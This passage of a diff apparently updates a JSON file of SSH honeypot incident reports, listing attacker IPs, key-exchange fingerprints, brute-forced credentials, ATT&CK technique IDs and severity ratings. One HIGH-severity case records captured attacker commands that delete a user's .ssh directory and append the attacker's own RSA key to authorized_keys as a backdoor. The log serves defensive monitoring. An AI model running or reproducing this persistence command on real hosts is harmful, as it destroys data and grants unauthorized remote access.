-            "hmac-sha2-256",
-            "hmac-sha2-512",
-            "hmac-md5",
-            "hmac-md5-96",
-            "hmac-ripemd160",
-            "hmac-ripemd160@openssh.com",
-            "umac-64@openssh.com",
-            "umac-128@openssh.com",
-            "hmac-sha1-etm@openssh.com",
-            "hmac-sha1-96-etm@openssh.com",
-            "hmac-sha2-256-etm@openssh.com",
-            "hmac-sha2-512-etm@openssh.com",
-            "hmac-md5-etm@openssh.com",
-            "hmac-md5-96-etm@openssh.com",
-            "hmac-ripemd160-etm@openssh.com",
-            "umac-64-etm@openssh.com",
-            "umac-128-etm@openssh.com"
-          ],
-          "compCS": [
-            "none",
-            "zlib@openssh.com",
-            "zlib"
-          ],
-          "langCS": [
-            ""
-          ],
-          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T06:20:27.300346Z",
-          "src_ip": "192.200.205.244",
-          "protocol": "ssh",
-          "event": "cowrie.client.kex"
-        },
-        {
-          "eventid": "cowrie.login.failed",
-          "username": "mysql",
-          "password": "webadmin",
-          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T06:20:29.153073Z",
-          "src_ip": "192.200.205.244",
-          "protocol": "ssh",
-          "event": "cowrie.login.failed"
-        },
-        {
-          "eventid": "cowrie.session.closed",
-          "duration": "4.0",
-          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T06:20:30.651018Z",
-          "src_ip": "192.200.205.244",
-          "protocol": "ssh",
-          "event": "cowrie.session.closed"
-        }
-      ]
-    },
-    {
-      "case_id": "IR-6b3138b21f3f",
-      "src_ip": "58.57.154.146",
-      "first_seen": "2026-04-02T06:23:17.397435Z",
-      "last_seen": "2026-04-02T06:23:20.711505Z",
-      "duration_seconds": 3,
-      "login_attempts": 1,
-      "login_success": false,
-      "commands": [],
-      "downloads": [],
-      "ttps": [
-        "T1110.001",
-        "T1592"
-      ],
-      "severity": "LOW",
-      "timeline": [
-        {
-          "eventid": "cowrie.session.connect",
-          "src_ip": "58.57.154.146",
-          "src_port": 59240,
-          "dst_ip": "172.31.34.72",
-          "dst_port": 2222,
-          "protocol": "ssh",
-          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T06:23:17.397435Z",
-          "event": "cowrie.session.connect"
-        },
-        {
-          "eventid": "cowrie.client.version",
-          "version": "SSH-2.0-OpenSSH_7.4",
-          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T06:23:17.864780Z",
-          "src_ip": "58.57.154.146",
-          "protocol": "ssh",
-          "event": "cowrie.client.version"
-        },
-        {
-          "eventid": "cowrie.client.kex",
-          "hassh": "acaa53e0a7d7ac7d1255103f37901306",
-          "hasshAlgorithms": "diffie-hellman-group1-sha1,diffie-hellman-group14-sha1,diffie-hellman-group14-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group-exchange-sha1,diffie-hellman-group-exchange-sha256,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,curve25519-sha256,curve25519-sha256@libssh.org,ext-info-c;des,3des,blowfish,none,3des-cbc,blowfish-cbc,cast128-cbc,arcfour,arcfour128,arcfour256,aes128-cbc,aes192-cbc,aes256-cbc,rijndael-cbc@lysator.liu.se,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-poly1305@openssh.com;hmac-sha1,hmac-sha1-96,hmac-sha2-256,hmac-sha2-512,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha1-96-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-md5-etm@openssh.com,hmac-md5-96-etm@openssh.com,hmac-ripemd160-etm@openssh.com,umac-64-etm@openssh.com,umac-128-etm@openssh.com;none,zlib@openssh.com,zlib",
-          "kexAlgs": [
-            "diffie-hellman-group1-sha1",
-            "diffie-hellman-group14-sha1",
-            "diffie-hellman-group14-sha256",
-            "diffie-hellman-group16-sha512",
-            "diffie-hellman-group18-sha512",
-            "diffie-hellman-group-exchange-sha1",
-            "diffie-hellman-group-exchange-sha256",
-            "ecdh-sha2-nistp256",
-            "ecdh-sha2-nistp384",
-            "ecdh-sha2-nistp521",
-            "curve25519-sha256",
-            "curve25519-sha256@libssh.org",
-            "ext-info-c"
-          ],
-          "keyAlgs": [
-            "ssh-ed25519",
-            "ssh-ed25519-cert-v01@openssh.com",
-            "ecdsa-sha2-nistp256",
-            "ecdsa-sha2-nistp256-cert-v01@openssh.com",
-            "ecdsa-sha2-nistp384",
-            "ecdsa-sha2-nistp384-cert-v01@openssh.com",
-            "ecdsa-sha2-nistp521",
-            "ecdsa-sha2-nistp521-cert-v01@openssh.com",
-            "ssh-rsa",
-            "ssh-rsa-cert-v01@openssh.com",
-            "ssh-dss",
-            "ssh-dss-cert-v01@openssh.com"
-          ],
-          "encCS": [
-            "des",
-            "3des",
-            "blowfish",
-            "none",
-            "3des-cbc",
-            "blowfish-cbc",
-            "cast128-cbc",
-            "arcfour",
-            "arcfour128",
-            "arcfour256",
-            "aes128-cbc",
-            "aes192-cbc",
-            "aes256-cbc",
-            "rijndael-cbc@lysator.liu.se",
-            "aes128-ctr",
-            "aes192-ctr",
-            "aes256-ctr",
-            "aes128-gcm@openssh.com",
-            "aes256-gcm@openssh.com",
-            "chacha20-poly1305@openssh.com"
-          ],
-          "macCS": [
-            "hmac-sha1",
-            "hmac-sha1-96",
-            "hmac-sha2-256",
-            "hmac-sha2-512",
-            "hmac-md5",
-            "hmac-md5-96",
-            "hmac-ripemd160",
-            "hmac-ripemd160@openssh.com",
-            "umac-64@openssh.com",
-            "umac-128@openssh.com",
-            "hmac-sha1-etm@openssh.com",
-            "hmac-sha1-96-etm@openssh.com",
-            "hmac-sha2-256-etm@openssh.com",
-            "hmac-sha2-512-etm@openssh.com",
-            "hmac-md5-etm@openssh.com",
-            "hmac-md5-96-etm@openssh.com",
-            "hmac-ripemd160-etm@openssh.com",
-            "umac-64-etm@openssh.com",
-            "umac-128-etm@openssh.com"
-          ],
-          "compCS": [
-            "none",
-            "zlib@openssh.com",
-            "zlib"
-          ],
-          "langCS": [
-            ""
-          ],
-          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T06:23:17.865508Z",
-          "src_ip": "58.57.154.146",
-          "protocol": "ssh",
-          "event": "cowrie.client.kex"
-        },
-        {
-          "eventid": "cowrie.login.failed",
-          "username": "postgres",
-          "password": "qwerty12",
-          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T06:23:19.182442Z",
-          "src_ip": "58.57.154.146",
+          "timestamp": "2026-04-02T07:20:01.466295Z",
+          "src_ip": "20.228.193.165",
           "protocol": "ssh",
           "event": "cowrie.login.failed"
         },
@@ -1024,192 +177,91 @@
           "eventid": "cowrie.session.closed",
           "duration": "3.3",
           "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T06:23:20.711505Z",
-          "src_ip": "58.57.154.146",
+          "timestamp": "2026-04-02T07:20:02.952753Z",
+          "src_ip": "20.228.193.165",
           "protocol": "ssh",
           "event": "cowrie.session.closed"
         }
       ]
     },
     {
-      "case_id": "IR-1117c8418e1b",
-      "src_ip": "222.128.15.127",
-      "first_seen": "2026-04-02T06:25:08.715098Z",
-      "last_seen": "2026-04-02T06:25:12.320816Z",
-      "duration_seconds": 3,
-      "login_attempts": 1,
-      "login_success": false,
-      "commands": [],
-      "downloads": [],
-      "ttps": [
-        "T1110.001",
-        "T1592"
-      ],
-      "severity": "LOW",
-      "timeline": [
-        {
-          "eventid": "cowrie.session.connect",
-          "src_ip": "222.128.15.127",
-          "src_port": 35576,
-          "dst_ip": "172.31.34.72",
-          "dst_port": 2222,
-          "protocol": "ssh",
-          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T06:25:08.715098Z",
-          "event": "cowrie.session.connect"
-        },
-        {
-          "eventid": "cowrie.client.version",
-          "version": "SSH-2.0-OpenSSH_7.4",
-          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T06:25:09.252825Z",
-          "src_ip": "222.128.15.127",
-          "protocol": "ssh",
-          "event": "cowrie.client.version"
-        },
-        {
-          "eventid": "cowrie.client.kex",
-          "hassh": "acaa53e0a7d7ac7d1255103f37901306",
-          "hasshAlgorithms": "diffie-hellman-group1-sha1,diffie-hellman-group14-sha1,diffie-hellman-group14-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group-exchange-sha1,diffie-hellman-group-exchange-sha256,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,curve25519-sha256,curve25519-sha256@libssh.org,ext-info-c;des,3des,blowfish,none,3des-cbc,blowfish-cbc,cast128-cbc,arcfour,arcfour128,arcfour256,aes128-cbc,aes192-cbc,aes256-cbc,rijndael-cbc@lysator.liu.se,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-poly1305@openssh.com;hmac-sha1,hmac-sha1-96,hmac-sha2-256,hmac-sha2-512,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha1-96-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-md5-etm@openssh.com,hmac-md5-96-etm@openssh.com,hmac-ripemd160-etm@openssh.com,umac-64-etm@openssh.com,umac-128-etm@openssh.com;none,zlib@openssh.com,zlib",
-          "kexAlgs": [
-            "diffie-hellman-group1-sha1",
-            "diffie-hellman-group14-sha1",
-            "diffie-hellman-group14-sha256",
-            "diffie-hellman-group16-sha512",
-            "diffie-hellman-group18-sha512",
-            "diffie-hellman-group-exchange-sha1",
-            "diffie-hellman-group-exchange-sha256",
-            "ecdh-sha2-nistp256",
-            "ecdh-sha2-nistp384",
-            "ecdh-sha2-nistp521",
-            "curve25519-sha256",
-            "curve25519-sha256@libssh.org",
-            "ext-info-c"
-          ],
-          "keyAlgs": [
-            "ssh-ed25519",
-            "ssh-ed25519-cert-v01@openssh.com",
-            "ecdsa-sha2-nistp256",
-            "ecdsa-sha2-nistp256-cert-v01@openssh.com",
-            "ecdsa-sha2-nistp384",
-            "ecdsa-sha2-nistp384-cert-v01@openssh.com",
-            "ecdsa-sha2-nistp521",
-            "ecdsa-sha2-nistp521-cert-v01@openssh.com",
-            "ssh-rsa",
-            "ssh-rsa-cert-v01@openssh.com",
-            "ssh-dss",
-            "ssh-dss-cert-v01@openssh.com"
-          ],
-          "encCS": [
-            "des",
-            "3des",
-            "blowfish",
-            "none",
-            "3des-cbc",
-            "blowfish-cbc",
-            "cast128-cbc",
-            "arcfour",
-            "arcfour128",
-            "arcfour256",
-            "aes128-cbc",
-            "aes192-cbc",
-            "aes256-cbc",
-            "rijndael-cbc@lysator.liu.se",
-            "aes128-ctr",
-            "aes192-ctr",
-            "aes256-ctr",
-            "aes128-gcm@openssh.com",
-            "aes256-gcm@openssh.com",
-            "chacha20-poly1305@openssh.com"
-          ],
-          "macCS": [
-            "hmac-sha1",
-            "hmac-sha1-96",
-            "hmac-sha2-256",
-            "hmac-sha2-512",
-            "hmac-md5",
-            "hmac-md5-96",
-            "hmac-ripemd160",
-            "hmac-ripemd160@openssh.com",
-            "umac-64@openssh.com",
-            "umac-128@openssh.com",
-            "hmac-sha1-etm@openssh.com",
-            "hmac-sha1-96-etm@openssh.com",
-            "hmac-sha2-256-etm@openssh.com",
-            "hmac-sha2-512-etm@openssh.com",
-            "hmac-md5-etm@openssh.com",
-            "hmac-md5-96-etm@openssh.com",
-            "hmac-ripemd160-etm@openssh.com",
-            "umac-64-etm@openssh.com",
-            "umac-128-etm@openssh.com"
-          ],
-          "compCS": [
-            "none",
-            "zlib@openssh.com",
-            "zlib"
-          ],
-          "langCS": [
-            ""
-          ],
-          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T06:25:09.253537Z",
-          "src_ip": "222.128.15.127",
-          "protocol": "ssh",
-          "event": "cowrie.client.kex"
-        },
-        {
-          "eventid": "cowrie.login.failed",
-          "username": "Nobody",
-          "password": "qwerty123",
-          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T06:25:10.788846Z",
-          "src_ip": "222.128.15.127",
-          "protocol": "ssh",
-          "event": "cowrie.login.failed"
-        },
-        {
-          "eventid": "cowrie.session.closed",
-          "duration": "3.6",
-          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T06:25:12.320816Z",
-          "src_ip": "222.128.15.127",
-          "protocol": "ssh",
-          "event": "cowrie.session.closed"
-        }
-      ]
-    },
-    {
-      "case_id": "IR-4626036e78db",
-      "src_ip": "180.76.146.235",
-      "first_seen": "2026-04-02T06:39:27.464351Z",
-      "last_seen": "2026-04-02T06:41:27.529870Z",
+      "case_id": "IR-01af0b2689e6",
+      "src_ip": "68.71.247.133",
+      "first_seen": "2026-04-02T07:21:19.650276Z",
+      "last_seen": "2026-04-02T07:23:19.732047Z",
       "duration_seconds": 120,
       "login_attempts": 0,
       "login_success": false,
       "commands": [],
       "downloads": [],
-      "ttps": [
-        "T1592"
-      ],
+      "ttps": [],
       "severity": "LOW",
       "timeline": [
         {
           "eventid": "cowrie.session.connect",
-          "src_ip": "180.76.146.235",
-          "src_port": 36297,
+          "src_ip": "68.71.247.133",
+          "src_port": 50980,
           "dst_ip": "172.31.34.72",
           "dst_port": 2222,
           "protocol": "ssh",
           "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T06:39:27.464351Z",
+          "timestamp": "2026-04-02T07:21:19.650276Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "eventid": "cowrie.session.closed",
+          "duration": "120.1",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:23:19.732047Z",
+          "src_ip": "68.71.247.133",
+          "protocol": "ssh",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-3f029577aa03",
+      "src_ip": "69.5.7.176",
+      "first_seen": "2026-04-02T07:38:22.153039Z",
+      "last_seen": "2026-04-02T07:38:27.297194Z",
+      "duration_seconds": 5,
+      "login_attempts": 1,
+      "login_success": true,
+      "commands": [
+        "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+        "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
+      ],
+      "downloads": [
+        {
+          "url": "",
+          "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2"
+        }
+      ],
+      "ttps": [
+        "T1021.004",
+        "T1078",
+        "T1105",
+        "T1592"
+      ],
+      "severity": "HIGH",
+      "timeline": [
+        {
+          "eventid": "cowrie.session.connect",
+          "src_ip": "69.5.7.176",
+          "src_port": 57418,
+          "dst_ip": "172.31.34.72",
+          "dst_port": 2222,
+          "protocol": "ssh",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:38:22.153039Z",
           "event": "cowrie.session.connect"
         },
         {
           "eventid": "cowrie.client.version",
           "version": "SSH-2.0-libssh_0.11.1",
           "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T06:39:27.465045Z",
-          "src_ip": "180.76.146.235",
+          "timestamp": "2026-04-02T07:38:22.153736Z",
+          "src_ip": "69.5.7.176",
           "protocol": "ssh",
           "event": "cowrie.client.version"
         },
@@ -1262,503 +314,120 @@
             ""
           ],
           "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T06:39:27.667586Z",
-          "src_ip": "180.76.146.235",
+          "timestamp": "2026-04-02T07:38:22.304247Z",
+          "src_ip": "69.5.7.176",
           "protocol": "ssh",
           "event": "cowrie.client.kex"
         },
         {
-          "eventid": "cowrie.session.closed",
-          "duration": "120.1",
+          "eventid": "cowrie.login.success",
+          "username": "root",
+          "password": "qaz123qaz123",
           "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T06:41:27.529870Z",
-          "src_ip": "180.76.146.235",
+          "timestamp": "2026-04-02T07:38:22.947421Z",
+          "src_ip": "69.5.7.176",
+          "protocol": "ssh",
+          "event": "cowrie.login.success"
+        },
+        {
+          "eventid": "cowrie.session.params",
+          "arch": "linux-arm-lsb",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:38:23.282347Z",
+          "src_ip": "69.5.7.176",
+          "protocol": "ssh",
+          "event": "cowrie.session.params"
+        },
+        {
+          "eventid": "cowrie.command.input",
+          "input": "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:38:23.282882Z",
+          "src_ip": "69.5.7.176",
+          "protocol": "ssh",
+          "event": "cowrie.command.input"
+        },
+        {
+          "eventid": "cowrie.command.failed",
+          "input": "lockr -ia .ssh",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:38:23.286630Z",
+          "src_ip": "69.5.7.176",
+          "protocol": "ssh",
+          "event": "cowrie.command.failed"
+        },
+        {
+          "eventid": "cowrie.log.closed",
+          "ttylog": "var/lib/cowrie/tty/c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644",
+          "size": 32,
+          "shasum": "c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644",
+          "duplicate": true,
+          "duration": "0.2",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:38:23.438495Z",
+          "src_ip": "69.5.7.176",
+          "protocol": "ssh",
+          "event": "cowrie.log.closed"
+        },
+        {
+          "eventid": "cowrie.session.params",
+          "arch": "linux-arm-lsb",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:38:23.856643Z",
+          "src_ip": "69.5.7.176",
+          "protocol": "ssh",
+          "event": "cowrie.session.params"
+        },
+        {
+          "eventid": "cowrie.command.input",
+          "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:38:23.857137Z",
+          "src_ip": "69.5.7.176",
+          "protocol": "ssh",
+          "event": "cowrie.command.input"
+        },
+        {
+          "eventid": "cowrie.session.file_download",
+          "duplicate": true,
+          "outfile": "var/lib/cowrie/downloads/a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+          "shasum": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+          "destfile": "/root/.ssh/authorized_keys",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:38:24.010067Z",
+          "src_ip": "69.5.7.176",
+          "protocol": "ssh",
+          "event": "cowrie.session.file_download"
+        },
+        {
+          "eventid": "cowrie.log.closed",
+          "ttylog": "var/lib/cowrie/tty/cc1eb03e9b5926d8076e25826664a04400de854bf5cc660fa35eb86cbdf7dc0f",
+          "size": 0,
+          "shasum": "cc1eb03e9b5926d8076e25826664a04400de854bf5cc660fa35eb86cbdf7dc0f",
+          "duplicate": true,
+          "duration": "0.2",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:38:24.010860Z",
+          "src_ip": "69.5.7.176",
+          "protocol": "ssh",
+          "event": "cowrie.log.closed"
+        },
+        {
+          "eventid": "cowrie.session.closed",
+          "duration": "5.1",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:38:27.297194Z",
+          "src_ip": "69.5.7.176",
           "protocol": "ssh",
           "event": "cowrie.session.closed"
         }
       ]
     },
     {
-      "case_id": "IR-5104b50c71d7",
-      "src_ip": "70.89.116.5",
-      "first_seen": "2026-04-02T06:40:19.252351Z",
-      "last_seen": "2026-04-02T06:40:23.611839Z",
-      "duration_seconds": 4,
-      "login_attempts": 1,
-      "login_success": false,
-      "commands": [],
-      "downloads": [],
-      "ttps": [
-        "T1110.001",
-        "T1592"
-      ],
-      "severity": "LOW",
-      "timeline": [
-        {
-          "eventid": "cowrie.session.connect",
-          "src_ip": "70.89.116.5",
-          "src_port": 38566,
-          "dst_ip": "172.31.34.72",
-          "dst_port": 2222,
-          "protocol": "ssh",
-          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T06:40:19.252351Z",
-          "event": "cowrie.session.connect"
-        },
-        {
-          "eventid": "cowrie.client.version",
-          "version": "SSH-2.0-OpenSSH_7.4",
-          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T06:40:20.069943Z",
-          "src_ip": "70.89.116.5",
-          "protocol": "ssh",
-          "event": "cowrie.client.version"
-        },
-        {
-          "eventid": "cowrie.client.kex",
-          "hassh": "acaa53e0a7d7ac7d1255103f37901306",
-          "hasshAlgorithms": "diffie-hellman-group1-sha1,diffie-hellman-group14-sha1,diffie-hellman-group14-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group-exchange-sha1,diffie-hellman-group-exchange-sha256,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,curve25519-sha256,curve25519-sha256@libssh.org,ext-info-c;des,3des,blowfish,none,3des-cbc,blowfish-cbc,cast128-cbc,arcfour,arcfour128,arcfour256,aes128-cbc,aes192-cbc,aes256-cbc,rijndael-cbc@lysator.liu.se,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-poly1305@openssh.com;hmac-sha1,hmac-sha1-96,hmac-sha2-256,hmac-sha2-512,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha1-96-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-md5-etm@openssh.com,hmac-md5-96-etm@openssh.com,hmac-ripemd160-etm@openssh.com,umac-64-etm@openssh.com,umac-128-etm@openssh.com;none,zlib@openssh.com,zlib",
-          "kexAlgs": [
-            "diffie-hellman-group1-sha1",
-            "diffie-hellman-group14-sha1",
-            "diffie-hellman-group14-sha256",
-            "diffie-hellman-group16-sha512",
-            "diffie-hellman-group18-sha512",
-            "diffie-hellman-group-exchange-sha1",
-            "diffie-hellman-group-exchange-sha256",
-            "ecdh-sha2-nistp256",
-            "ecdh-sha2-nistp384",
-            "ecdh-sha2-nistp521",
-            "curve25519-sha256",
-            "curve25519-sha256@libssh.org",
-            "ext-info-c"
-          ],
-          "keyAlgs": [
-            "ssh-ed25519",
-            "ssh-ed25519-cert-v01@openssh.com",
-            "ecdsa-sha2-nistp256",
-            "ecdsa-sha2-nistp256-cert-v01@openssh.com",
-            "ecdsa-sha2-nistp384",
-            "ecdsa-sha2-nistp384-cert-v01@openssh.com",
-            "ecdsa-sha2-nistp521",
-            "ecdsa-sha2-nistp521-cert-v01@openssh.com",
-            "ssh-rsa",
-            "ssh-rsa-cert-v01@openssh.com",
-            "ssh-dss",
-            "ssh-dss-cert-v01@openssh.com"
-          ],
-          "encCS": [
-            "des",
-            "3des",
-            "blowfish",
-            "none",
-            "3des-cbc",
-            "blowfish-cbc",
-            "cast128-cbc",
-            "arcfour",
-            "arcfour128",
-            "arcfour256",
-            "aes128-cbc",
-            "aes192-cbc",
-            "aes256-cbc",
-            "rijndael-cbc@lysator.liu.se",
-            "aes128-ctr",
-            "aes192-ctr",
-            "aes256-ctr",
-            "aes128-gcm@openssh.com",
-            "aes256-gcm@openssh.com",
-            "chacha20-poly1305@openssh.com"
-          ],
-          "macCS": [
-            "hmac-sha1",
-            "hmac-sha1-96",
-            "hmac-sha2-256",
-            "hmac-sha2-512",
-            "hmac-md5",
-            "hmac-md5-96",
-            "hmac-ripemd160",
-            "hmac-ripemd160@openssh.com",
-            "umac-64@openssh.com",
-            "umac-128@openssh.com",
-            "hmac-sha1-etm@openssh.com",
-            "hmac-sha1-96-etm@openssh.com",
-            "hmac-sha2-256-etm@openssh.com",
-            "hmac-sha2-512-etm@openssh.com",
-            "hmac-md5-etm@openssh.com",
-            "hmac-md5-96-etm@openssh.com",
-            "hmac-ripemd160-etm@openssh.com",
-            "umac-64-etm@openssh.com",
-            "umac-128-etm@openssh.com"
-          ],
-          "compCS": [
-            "none",
-            "zlib@openssh.com",
-            "zlib"
-          ],
-          "langCS": [
-            ""
-          ],
-          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T06:40:20.070817Z",
-          "src_ip": "70.89.116.5",
-          "protocol": "ssh",
-          "event": "cowrie.client.kex"
-        },
-        {
-          "eventid": "cowrie.login.failed",
-          "username": "User",
-          "password": "123456789",
-          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T06:40:22.012073Z",
-          "src_ip": "70.89.116.5",
-          "protocol": "ssh",
-          "event": "cowrie.login.failed"
-        },
-        {
-          "eventid": "cowrie.session.closed",
-          "duration": "4.4",
-          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T06:40:23.611839Z",
-          "src_ip": "70.89.116.5",
-          "protocol": "ssh",
-          "event": "cowrie.session.closed"
-        }
-      ]
-    },
-    {
-      "case_id": "IR-420d35127913",
-      "src_ip": "222.236.155.146",
-      "first_seen": "2026-04-02T06:42:59.125518Z",
-      "last_seen": "2026-04-02T06:43:03.673660Z",
-      "duration_seconds": 4,
-      "login_attempts": 1,
-      "login_success": false,
-      "commands": [],
-      "downloads": [],
-      "ttps": [
-        "T1110.001",
-        "T1592"
-      ],
-      "severity": "LOW",
-      "timeline": [
-        {
-          "eventid": "cowrie.session.connect",
-          "src_ip": "222.236.155.146",
-          "src_port": 34649,
-          "dst_ip": "172.31.34.72",
-          "dst_port": 2222,
-          "protocol": "ssh",
-          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T06:42:59.125518Z",
-          "event": "cowrie.session.connect"
-        },
-        {
-          "eventid": "cowrie.client.version",
-          "version": "SSH-2.0-OpenSSH_7.4",
-          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T06:42:59.947326Z",
-          "src_ip": "222.236.155.146",
-          "protocol": "ssh",
-          "event": "cowrie.client.version"
-        },
-        {
-          "eventid": "cowrie.client.kex",
-          "hassh": "acaa53e0a7d7ac7d1255103f37901306",
